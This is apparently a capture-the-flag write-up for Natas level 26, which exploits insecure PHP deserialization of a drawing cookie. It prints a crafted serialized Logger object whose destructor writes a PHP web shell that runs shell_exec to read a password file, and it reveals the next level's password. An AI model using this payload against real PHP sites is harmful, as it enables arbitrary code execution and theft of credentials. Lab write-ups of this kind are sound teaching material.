Webpage allows to enter coordinates and draw lines in an image. Here is the addreviated source code:
```
<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));

[... Truncated ...]

        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }

?>

[... Truncated ...]

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Essentially:
- a session is started
- if the request has parameters for the coordinates it draws the image
- also an object with all 4 coordinates is serialized and saved in a cookie
- for subsequent requests, the PHP code reads the cookie in addition to the request parameters. Then it deserializes the object, extract the coordinates and draws the image

After looking at the code briefly it appears that:
1. the Logger class is not used
2. the vuln appears to be a insecure deserialization performed in functions `drawFromUserData()` and `storeData()`

I am not too familiar with PHP deserialization so I ran some tests locally first. The PHP serialization format is straight-forward, you can find an explanation at https://portswigger.net/web-security/deserialization/exploiting.

So it appears that when a PHP object is deserialized magic function `__construct()` is not called. However the PHP object is assigned to a variable, and when the variable gets out of scope the object is removed and magic function `__destruct()` is called:
```
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
```

The constructor for the object is not called, instead the values for `$this->logFile` and `$this->exitMsg` are taken from the serialized object. So we have an arbitrary file write primitive!!

What can we do with it? Well we can create a PHP file and then request it to get code execution:
```
O:6:"Logger":2:{s:7:"logFile";s:44:"img/natas26_qhs8kerauv8ff886lh2e5gt3jp.1.php";s:7:"exitMsg";s:59:"<?php echo shell_exec("cat /etc/natas_webpass/natas27"); ?>";}
```

Then we compute the base64 encoding, use it to replace the value of our `drawing` cookie, and finally reload the page.

When we do that file `img/natas26_qhs8kerauv8ff886lh2e5gt3jp.1.php` is created, then we just have to load it to get the next level password.

Password for the next level is `u3RRffXjysjgwFU6b9xa23i6prmUsYne`.
